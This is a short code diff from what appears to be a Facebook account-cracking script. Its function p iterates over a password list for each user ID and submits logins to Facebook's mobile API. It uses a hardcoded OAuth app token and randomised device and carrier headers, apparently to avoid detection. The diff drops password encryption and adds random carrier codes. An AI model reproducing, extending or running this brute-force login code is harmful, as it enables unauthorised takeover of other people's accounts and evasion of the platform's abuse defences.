@@ -72,22 +72,6 @@ from concurrent.futures import ThreadPoolExecutor as ThreadPool
 from bs4 import BeautifulSoup as par
 from datetime import date
 from datetime import datetime
-import os
-import re
-import sys
-import json
-import requests
-import time
-import uuid
-import random
-from rich.console import Console
-from concurrent.futures import ThreadPoolExecutor
-import hmac, hashlib, urllib, shutil, binascii, string, base64, io, struct
-from Cryptodome import Random
-from Cryptodome.Cipher import AES, PKCS1_v1_5
-from Cryptodome.PublicKey import RSA
-from Cryptodome.Random import get_random_bytes
-from nacl.public import PublicKey,SealedBox
 # from rich import print as printer
 from datetime import date
 import marshal
@@ -1470,7 +1454,7 @@ def p(uid,pwx,tl):
         for password in pwx:
             data = {
             'email': uid,
-            'password': Encrypt_PWD().PWD_FB4A(password),
+            'password': password,
             'adid': str(uuid.uuid4()),
             'device_id': str(uuid.uuid4()),
             'family_device_id': str(uuid.uuid4()),
@@ -1505,8 +1489,8 @@ def p(uid,pwx,tl):
             'Accept': '*/*',
             'Connection': 'keep-alive',
             'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
-            'X-FB-SIM-HNI': '28255',
-            'X-FB-Net-HNI': '28732',
+            'X-FB-SIM-HNI': str(random.randint(20000,40000)),
+            'X-FB-Net-HNI': str(random.randint(20000,40000)),
             'X-FB-Connection-Bandwidth': '27181576',
             'X-FB-Connection-Quality': 'EXCELLENT',
             'X-FB-Connection-Type': 'MOBILE.LTE',
